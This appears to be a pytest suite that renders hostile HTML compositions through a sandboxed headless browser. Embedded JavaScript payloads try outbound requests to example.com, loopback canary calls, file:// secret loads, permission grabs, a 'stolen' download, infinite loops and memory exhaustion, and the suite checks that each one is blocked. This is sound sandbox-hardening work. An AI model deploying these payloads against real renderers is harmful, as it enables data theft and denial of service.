# ruff: noqa: E501, ASYNC221  (page payloads are JavaScript in strings; the tests run ffmpeg and ps on purpose)
"""Hostile compositions rendered through the real adapter with the real pinned browser (V1b).

Each composition is a page that attacks while HyperFrames renders it, and paints the whole frame green if
every attack failed and red if one worked. The browser's own record is what counts: a canary service on
loopback must have heard nothing, and the filter must have refused what the page asked for.

Skipped unless a component is installed: set `WASIFYAI_VIDEO_BUILDER_HOME` to
`<app data>/components/video-builder` (CI installs it with `scripts/ci-video-builder.py`)."""

import hashlib
import http.server
import os
import shutil
import socketserver
import subprocess
import threading
from pathlib import Path

import pytest
from wasifyai_api import video_builder_runtime as vb
from wasifyai_api import video_builder_sandbox as sb

INSTALL = vb.find_install(Path("/nonexistent"))
pytestmark = pytest.mark.skipif(
    INSTALL is None or len(vb.find_media_tools(INSTALL)) < len(vb.MEDIA_TOOLS),
    reason="the Video Builder component or FFmpeg (with ffprobe) is not installed",
)

PAGE = """<!doctype html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=1280, height=720">
<script src="vendor/gsap.min.js"></script>
<style>*{margin:0;padding:0} html,body{width:1280px;height:720px;overflow:hidden;background:#101820}
#root{position:relative;width:100%;height:100%}
#out{position:absolute;inset:0;background:#101820}</style></head><body>
<div id="root" data-composition-id="main" data-start="0" data-duration="4" data-width="1280" data-height="720">
<div id="out" class="clip" data-start="0" data-duration="4" data-track-index="0"></div></div>
<script>
const out = document.getElementById("out");
const paint = (good) => { out.style.background = good ? "#00ff00" : "#ff0000"; };
const within = (p, ms) => Promise.race([p, new Promise((_, r) => setTimeout(() => r(new Error("timeout")), ms))]);
// resolves true when `attempt` failed (the wanted outcome), false when it worked
const failed = async (attempt, ms = 1500) => { try { await within(attempt(), ms); return false; } catch (e) { return true; } };
async function attack() { %PAYLOAD% }
window.addEventListener("load", () => setTimeout(() => attack().then((v) => { if (v !== undefined) paint(v); }, () => paint(false)), 100));
const tl = gsap.timeline({ paused: true }); tl.to({}, { duration: 4 });
%TWEEN%
window.__timelines["main"] = tl; tl.seek(0);
</script></body></html>"""

PAYLOADS = {
    "remote": """
      const rs = await Promise.all([
        failed(() => fetch("https://example.com/", { mode: "no-cors" })),
        failed(() => new Promise((res, rej) => { const x = new XMLHttpRequest(); x.open("GET", "http://example.com/");
                                                  x.onload = res; x.onerror = rej; x.send(); })),
        failed(() => new Promise((res, rej) => { const i = new Image(); i.onload = res; i.onerror = rej; i.src = "https://example.com/x.png"; })),
        failed(() => new Promise((res, rej) => { const s = document.createElement("script"); s.onload = res; s.onerror = rej;
                                                  s.src = "https://example.com/x.js"; document.head.appendChild(s); })),
        failed(() => new Promise((res, rej) => { const w = new WebSocket("wss://example.com/"); w.onopen = res; w.onerror = rej; })),
        failed(() => fetch("https://example.com/b", { method: "POST", body: "x", keepalive: true, mode: "no-cors" })),
      ]);
      return rs.every(Boolean);""",
    "localhost": """
      const rs = await Promise.all([
        failed(() => fetch("http://127.0.0.1:%CANARY%/f", { mode: "no-cors" })),
        failed(() => fetch("http://localhost:%CANARY%/f2", { mode: "no-cors" })),
        failed(() => new Promise((res, rej) => { const w = new WebSocket("ws://127.0.0.1:%CANARY%/"); w.onopen = res; w.onerror = rej; })),
        failed(() => new Promise((res, rej) => { const i = new Image(); i.onload = res; i.onerror = rej; i.src = "http://127.0.0.1:%CANARY%/i.png"; })),
      ]);
      return rs.every(Boolean);""",
    "file": """
      const a = await failed(() => new Promise((res, rej) => { const s = document.createElement("script"); s.onload = res; s.onerror = rej;
                                                                s.src = "file://%SECRET%"; document.head.appendChild(s); }));
      const b = await failed(() => new Promise((res, rej) => { const i = new Image(); i.onload = res; i.onerror = rej; i.src = "file://%SECRET_PNG%"; }));
      return a && b && window.SECRET === undefined;""",
    "permissions": """
      const geo = await failed(() => new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej)));
      const note = typeof Notification === "undefined" ? "denied" : await Notification.requestPermission();
      const cam = await failed(() => navigator.mediaDevices.getUserMedia({ video: true }));
      return geo && note !== "granted" && cam;""",
    "popup_download": """
      window.open("https://example.com/popup", "_blank");
      const a = document.createElement("a");
      a.href = URL.createObjectURL(new Blob(["stolen"], { type: "text/plain" })); a.download = "stolen.txt";
      document.body.appendChild(a); a.click();
      await new Promise((r) => setTimeout(r, 800));
      return true;""",
    "alert": """alert("hello"); return true;""",
    "loop": """for (;;) {} return true;""",
    # random bytes, not a constant: macOS compresses a page of ones, so a small runner's resident size
    # never grew (the first CI run drew the whole video); a failed allocation is tried again
    "memory": """
      const keep = [];
      const noise = (a) => { for (let o = 0; o < a.length; o += 65536) crypto.getRandomValues(a.subarray(o, o + 65536)); };
      for (;;) {
        try { const a = new Uint8Array(64 * 1024 * 1024); noise(a); keep.push(a); } catch (e) {}
        await new Promise((r) => setTimeout(r, 5));
      }""",
    # no clock in this one: the picture follows the timeline only, so two renders can match to the byte
    "control": """return undefined;""",
}


class Canary:
    def __init__(self) -> None:
        self.hits: list[str] = []
        hits = self.hits

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self) -> None:  # noqa: N802
                hits.append(self.path)
                self.send_response(200)
                self.end_headers()
                self.wfile.write(b"canary")

            do_POST = do_GET  # noqa: N815

            def log_message(self, format: str, *args: object) -> None:  # noqa: A002
                pass

        self.server = socketserver.ThreadingTCPServer(("127.0.0.1", 0), Handler)
        self.server.daemon_threads = True
        self.port = self.server.server_address[1]
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()


@pytest.fixture
def canary():
    c = Canary()
    yield c
    c.close()


@pytest.fixture
def secret(tmp_path):
    d = tmp_path / "secret"
    d.mkdir()
    (d / "secret.js").write_text("window.SECRET = 'leaked';")
    (d / "secret.png").write_bytes(
        bytes.fromhex("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"
                      "0000000d4944415478da63f8cfc0f01f0005000201e5273e3a0000000049454e44ae426082")
    )  # fmt: skip
    return d


def make_project(tmp_path: Path, name: str, canary: Canary, secret: Path) -> Path:
    assert INSTALL is not None
    proj = tmp_path / f"proj-{name}"
    (proj / "vendor").mkdir(parents=True)
    shutil.copyfile(
        INSTALL.app / "node_modules" / "gsap" / "dist" / "gsap.min.js",
        proj / "vendor" / "gsap.min.js",
    )
    payload = (
        PAYLOADS[name]
        .replace("%CANARY%", str(canary.port))
        .replace("%SECRET%", str(secret / "secret.js"))
        .replace("%SECRET_PNG%", str(secret / "secret.png"))
    )
    tween = (
        'tl.to("#out", { backgroundColor: "#00ff00", duration: 2 }, 0);'
        if name == "control"
        else ""
    )
    (proj / "index.html").write_text(PAGE.replace("%PAYLOAD%", payload).replace("%TWEEN%", tween))
    return proj


def frame_colour(video: Path, at: float = 3.5) -> tuple[int, int, int]:
    import imageio_ffmpeg

    raw = subprocess.run(
        [imageio_ffmpeg.get_ffmpeg_exe(), "-loglevel", "error", "-ss", str(at), "-i", str(video),
         "-frames:v", "1", "-vf", "scale=1:1", "-f", "rawvideo", "-pix_fmt", "rgb24", "-"],
        capture_output=True, check=True,
    ).stdout  # fmt: skip
    return raw[0], raw[1], raw[2]


def produced(result: sb.RenderResult) -> Path:
    assert result.ok and result.output is not None, result.log_tail
    return result.output


def is_green(rgb: tuple[int, int, int]) -> bool:
    r, g, b = rgb
    return g > 200 and r < 80 and b < 80


def leftover_processes() -> list[str]:
    assert INSTALL is not None
    out = subprocess.run(["ps", "-A", "-o", "command="], capture_output=True, text=True).stdout
    return [line for line in out.splitlines() if str(INSTALL.root) in line and "pytest" not in line]


async def render(tmp_path, name, canary, secret, **limits):
    assert INSTALL is not None
    proj = make_project(tmp_path, name, canary, secret)
    result = await sb.run_render(
        INSTALL, proj, tmp_path / f"{name}.mp4", limits=sb.RenderLimits(**limits), skip_lint=True
    )
    return result


# ---- the attacks that must fail without stopping the render ---------------------------------------


@pytest.mark.parametrize("name", ["remote", "localhost", "file", "permissions"])
async def test_the_page_reaches_nothing_and_the_video_is_still_made(tmp_path, canary, secret, name):
    result = await render(tmp_path, name, canary, secret, wall_s=180, stall_s=90)
    assert result.ok, result.log_tail
    assert is_green(frame_colour(produced(result))), (
        f"an attack worked: frame {frame_colour(produced(result))}"
    )
    assert canary.hits == []  # the service on loopback heard nothing
    if name in ("remote", "localhost"):
        assert result.blocked_count > 0 and any(
            "example.com" in b or str(canary.port) in b for b in result.blocked
        )
    assert not leftover_processes()


async def test_a_popup_and_a_download_get_nowhere(tmp_path, canary, secret):
    downloads = Path.home() / "Downloads"
    before = set(downloads.glob("stolen*")) if downloads.is_dir() else set()
    result = await render(tmp_path, "popup_download", canary, secret, wall_s=180, stall_s=90)
    assert result.ok, result.log_tail
    assert canary.hits == []
    assert any("example.com" in b for b in result.blocked) or result.blocked_count == 0
    # a saved file lands in the throwaway home the browser was given, and is deleted with it
    after = set(downloads.glob("stolen*")) if downloads.is_dir() else set()
    assert after == before
    assert not leftover_processes()


# ---- the attacks that must be stopped --------------------------------------------------------------


@pytest.mark.parametrize("name", ["loop", "alert"])
async def test_a_page_that_hangs_the_render_is_stopped_and_cleaned_up(
    tmp_path, canary, secret, name
):
    result = await render(tmp_path, name, canary, secret, wall_s=45, stall_s=25)
    assert not result.ok and result.reason in ("stalled", "wall_time", "failed")
    assert result.seconds < 60
    assert not leftover_processes()


async def test_a_page_that_eats_memory_is_stopped_near_the_limit(tmp_path, canary, secret):
    limit = 3 * 1024**3  # a normal render holds about 2 GB (V0)
    result = await render(
        tmp_path, "memory", canary, secret, wall_s=120, stall_s=60, rss_bytes=limit
    )
    assert result.reason == "memory", (result.reason, result.log_tail)
    assert result.peak_rss_bytes < limit + 1024**3  # the overshoot of a 25 to 40 ms poll
    assert not leftover_processes()


# ---- the render itself is unchanged ---------------------------------------------------------------


async def test_the_sandboxed_render_is_byte_identical_to_the_unsandboxed_one(
    tmp_path, canary, secret
):
    assert INSTALL is not None
    proj = make_project(tmp_path, "control", canary, secret)
    result = await sb.run_render(INSTALL, proj, tmp_path / "sandboxed.mp4", skip_lint=True)
    assert result.ok and is_green(frame_colour(produced(result)))
    plain = tmp_path / "plain.mp4"
    env = vb.render_env(
        INSTALL,
        {
            "HYPERFRAMES_BROWSER_PATH": str(INSTALL.shell),
            "PRODUCER_HEADLESS_SHELL_PATH": str(INSTALL.shell),
        },
    )
    subprocess.run(
        [str(INSTALL.node), str(INSTALL.cli), "render", "--output", str(plain)],
        cwd=proj, env=env, check=True, capture_output=True, timeout=240,
    )  # fmt: skip
    digest = lambda p: hashlib.sha256(p.read_bytes()).hexdigest()  # noqa: E731
    assert digest(produced(result)) == digest(plain)


async def test_the_installed_component_leaves_the_persons_home_alone(tmp_path, canary, secret):
    before = (
        {p: p.stat().st_mtime for p in (Path.home() / ".hyperframes").rglob("*")}
        if (Path.home() / ".hyperframes").exists()
        else {}
    )
    result = await render(tmp_path, "control", canary, secret, wall_s=180, stall_s=90)
    assert result.ok
    after = (
        {p: p.stat().st_mtime for p in (Path.home() / ".hyperframes").rglob("*")}
        if (Path.home() / ".hyperframes").exists()
        else {}
    )
    assert (
        before == after and os.environ.get("HYPERFRAMES_NO_TELEMETRY") is None
    )  # nothing leaked in either way


async def test_the_corpus_bites_the_same_page_reaches_the_service_without_the_sandbox(
    tmp_path, canary, secret
):
    """If this ever passes while the sandboxed test above also passes, the corpus proves nothing."""
    assert INSTALL is not None
    proj = make_project(tmp_path, "localhost", canary, secret)
    env = vb.render_env(
        INSTALL,
        {
            "HYPERFRAMES_BROWSER_PATH": str(INSTALL.shell),
            "PRODUCER_HEADLESS_SHELL_PATH": str(INSTALL.shell),
        },
    )
    out = tmp_path / "plain.mp4"
    subprocess.run(
        [str(INSTALL.node), str(INSTALL.cli), "render", "--output", str(out)],
        cwd=proj, env=env, check=True, capture_output=True, timeout=240,
    )  # fmt: skip
    assert canary.hits  # the stock launch lets the page reach the service on loopback
    assert not is_green(frame_colour(out))
